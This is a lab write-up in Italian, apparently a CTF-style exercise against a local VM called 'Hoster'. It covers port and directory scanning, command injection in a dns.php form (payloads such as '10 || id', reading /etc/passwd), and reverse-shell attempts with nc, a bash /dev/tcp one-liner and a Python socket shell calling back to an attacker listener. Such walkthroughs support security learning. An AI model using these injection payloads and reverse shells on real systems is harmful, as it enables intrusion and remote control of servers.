#+title: VDSI - Hoster
#+author: Andrea Pepe
#+date: 27/05/2022

* Foothold
** Subnet scanning
Essendo la macchina target una VM che runna in locale, c'è bisogno di
fare uno scan della sottorete per individuare l'indirizzo IP della
macchina target. Lo facciamo tramite *nmap*:
#+begin_example
$ sudo nmap -Pn 192.168.56.101/24

sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 17:31 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00024s latency).
All 1000 scanned ports on 192.168.56.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 0A:00:27:00:00:03 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.000099s latency).
All 1000 scanned ports on 192.168.56.100 are in ignored states.
Not shown: 1000 filtered tcp ports (proto-unreach)
MAC Address: 08:00:27:F7:E0:61 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.103
Host is up (0.00078s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E1:BF:F8 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.0000060s latency).
All 1000 scanned ports on 192.168.56.101 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (4 hosts up) scanned in 10.40 seconds
#+end_example

L'indirizzo IP della macchina target è *192.168.56.103* e lo associamo
al nome *hoster* nel file */etc/hosts*.
** nmap
*** tcp
#+begin_example
$ nmap -sC -sV hoster                                                     1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 17:59 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for hoster (192.168.56.103)
Host is up (0.00092s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:6f:f4:ec:81:18:59:29:e7:60:08:93:14:18:ba:2e (RSA)
|   256 95:5e:dc:83:fe:e0:00:40:ee:a2:2e:2d:69:00:b0:1f (ECDSA)
|_  256 d8:c4:8d:12:f5:84:a9:80:0a:e8:31:8c:3a:a3:98:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Webifier Hosting and Domain Registration
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
#+end_example

#+begin_example
$ nmap -p- hoster                                                         1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 18:01 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 64.55% done; ETC: 18:03 (0:00:46 remaining)
Nmap scan report for hoster (192.168.56.103)
Host is up (0.0020s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
#+end_example

*** udp
#+begin_example
$ sudo nmap -sU 192.168.56.103
sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 18:01 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for hoster (192.168.56.103)
Host is up (0.00079s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT   STATE  SERVICE
22/udp closed ssh
80/udp closed http
MAC Address: 08:00:27:E1:BF:F8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.45 seconds
#+end_example
** http
Il servizio web sembra essere una piattaforma per hostare dei servizi
web a pagamento, con diversi piani di acquisto. Per due di essi (su 3,
l'altro è gratuito) è necessario registrarsi tramite un form http.
Tuttavia, non sembra esserci una pagina di login.

Tramite il plugin *Wappalyzer* vediamo che il web server è Apache e che
i linguaggi di programmazione utilizzati sono il *php* e lato client
viene fatto uso di *jquery*.

Proviamo dunque a fare una enumerazione sia di virtual hosts che di
directory alla ricerca di una eventuale pagina di login o qualsiasi
altra informazione utile. 

*** vhost enumeration
Da un'analisi effettuata tramite *gobuster* non sembrano esserci virtual
hosts.
#+begin_example
$ gobuster vhost -u http://192.168.56.103 -w ~/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 2>/dev/null                      1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://192.168.56.103
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/andrea/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/05/27 18:22:10 Starting gobuster in VHOST enumeration mode
===============================================================
===============================================================
2022/05/27 18:22:22 Finished
===============================================================
#+end_example


*** dir enumeration
#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hoster -x html,txt                                            130 ⨯ 1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hoster
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt
[+] Timeout:                 10s
===============================================================
2022/05/27 18:11:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 301] [--> http://hoster/images/]
/index.html           (Status: 200) [Size: 6386]                           
/css                  (Status: 301) [Size: 298] [--> http://hoster/css/]   
/js                   (Status: 301) [Size: 297] [--> http://hoster/js/]    
/server-status        (Status: 403) [Size: 294]                            
                                                                           
===============================================================
2022/05/27 18:11:57 Finished
===============================================================
#+end_example

#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hoster -x php                                                       1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hoster
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/05/27 18:12:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 301] [--> http://hoster/images/]
/css                  (Status: 301) [Size: 298] [--> http://hoster/css/]   
/js                   (Status: 301) [Size: 297] [--> http://hoster/js/]    
/dns.php              (Status: 200) [Size: 1546]                           
/server-status        (Status: 403) [Size: 294]                            
                                                                           
===============================================================
2022/05/27 18:12:34 Finished
===============================================================
#+end_example

Vediamo che di interessante c'è la pagina *server-status* a cui non è
possibile accedere perché non si posseggono i privilegi necessari;
inoltre, sembra molto interessante la pagina *dns.php*.
** command injection
La pagina *dns.php* si presenta come un form di post con l'output del
comando ~host~ e delle sue opzioni di utilizzo. Nel form di post è
possibile passare gli argomenti ad *host*.

Titolo: *Domain DNS Checker*
Input: *Input domain*
Submit: *Check*

#+begin_example
Usage: host [-aCdlriTwv] [-c class] [-N ndots] [-t type] [-W time]
            [-R number] [-m flag] hostname [server]
       -a is equivalent to -v -t ANY
       -c specifies query class for non-IN data
       -C compares SOA records on authoritative nameservers
       -d is equivalent to -v
       -l lists all hosts in a domain, using AXFR
       -i IP6.INT reverse lookups
       -N changes the number of dots allowed before root lookup is done
       -r disables recursive processing
       -R specifies number of retries for UDP packets
       -s a SERVFAIL response should stop query
       -t specifies the query type
       -T enables TCP/IP mode
       -v enables verbose output
       -w specifies to wait forever for a reply
       -W specifies how long to wait for a reply
       -4 use IPv4 query transport only
       -6 use IPv6 query transport only
       -m set memory debugging flag (trace|record|usage)
       -V print version number and exit
#+end_example

*** localhost
Se passiamo come parametro di input la parola ~localhost~, otteniamo il
seguente output:
#+begin_example
localhost has address 127.0.0.1
localhost has IPv6 address ::1
#+end_example

*** localhost; id
#+begin_example
host: couldn't get address for 'id': not found
#+end_example

Proviamo altri delimitatori.

*** localhost && id
#+begin_example
host: couldn't get address for 'id': not found
#+end_example

*** 10 || id
#+begin_example
uid=33(www-data) gid=33(www-data) groups=33(www-data)
#+end_example

Mandando in errore il primo comando (*host 10* va in errore) ed
utilizzando il delimitatore *||* viene eseguito il secondo comando e
abbiamo una *command injection*!

*** localhost | id
#+begin_example
uid=33(www-data) gid=33(www-data) groups=33(www-data)
#+end_example

La command injection c'è anche utilizzando la pipe come delimitatore
tra i comandi!
** www-data
Cerchiamo di esfiltrare informazioni utili per poter ottenere una
shell'all'interno della macchina target.

*** localhost | cat /etc/passwd
#+begin_example
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
web_8357243:x:1000:1000:web_8357243,,,:/home/web_8357243:/bin/bash
monitor:x:1001:1001::/monitoring:
#+end_example

Vediamo che ci sono due utenti interessanti:
*web_8357243* e *monitoring*.

*** localhost | ls -la /home
#+begin_example
total 12
drwxr-xr-x  3 root        root        4096 Jul 31  2019 .
drwxr-xr-x 25 root        root        4096 Sep 27  2019 ..
drwxr-xr-x  6 web_8357243 web_8357243 4096 Jun 16  2020 web_8357243
#+end_example

Vediamo che solo l'utente *web_8357243* è nella cartella /home, a cui
abbiamo diritto d'accesso in lettura, quindi vediamo se ci sono
delle credenziali ssh per connetterci alla macchina.

*** localhost | ls -la /home/web_8357243
#+begin_example
total 44
drwxr-xr-x 6 web_8357243 web_8357243 4096 Jun 16  2020 .
drwxr-xr-x 3 root        root        4096 Jul 31  2019 ..
lrwxrwxrwx 1 root        root           9 Dec  9  2019 .bash_history -> /dev/null
-rw-r--r-- 1 web_8357243 web_8357243  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 web_8357243 web_8357243 3771 Jul 31  2019 .bashrc
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .cache
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .gnupg
drwxrwxr-x 2 web_8357243 web_8357243 4096 Jul 31  2019 .nano
-rw-r--r-- 1 web_8357243 web_8357243  655 Jul 31  2019 .profile
drwx------ 2 web_8357243 web_8357243 4096 Sep 28  2019 .ssh
-rw-r--r-- 1 web_8357243 web_8357243    0 Jul 31  2019 .sudo_as_admin_successful
-rw------- 1 web_8357243 web_8357243  725 Jun 16  2020 .viminfo
-rw-rw-r-- 1 web_8357243 web_8357243   22 Jun 16  2020 flag.txt
#+end_example

Purtroppo non abbiamo i permessi d'accesso alla cartella *.ssh*.
Sfruttiamo quindi direttamente la command injection per ottenere una
reverse shell.
** reverse shell

*** make sure nc is present
Iniettando l'input ~localhost | which nc~, viene restituito in output:
#+begin_example
/bin/nc
#+end_example
Dunque, *netcat* è presente e possiamo sfruttarlo per ottenre una
reverse shell.

*** nc
Sulla macchina kali locale ci mettiamo in ascolto sulla porta 4321:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
#+end_example

Iniettiamo il comando nel form della pagina *dns.php*:
#+begin_example
localhost | nc 192.168.56.101 4321
#+end_example

Tuttavia, in questo modo, l'output del comando *host localhost* viene
inviato con netcat alla kali e la connessione viene chiusa
immediatamente.

Inserendo il comando per spawnare la shell, il messaggio di riotrno è
il seguente
#+begin_example
localhost | nc 192.168.56.101 4321 -e /bin/bash

nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
	  [-x proxy_address[:port]] [destination] [port]
#+end_example
Proviamo a sfruttare l'altra command injection con il delimitatore *||*.

#+begin_example
10 || nc 192.168.56.101 4321 -e /bin/bash
#+end_example

Nulla, otteniamo lo stesso errore! La versione di *nc* installata sulla
macchina target non supporta il flag *-e*.

*** bash reverse shell
Optiamo quindi per ottenere una reverse shell direttamente in bash,
presa da [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp][PayloadAllTheThings]]:
#+begin_example
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
#+end_example

Iniettiamo quindi:
#+begin_example
10 || bash -i >& /dev/tcp/192.168.56.101/4321 0>&1
#+end_example

Non essendo fortunati nemmeno con questo, proviamo con una reverse
shell in python.

*** pyhton reverse shell
#+begin_example
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
#+end_example
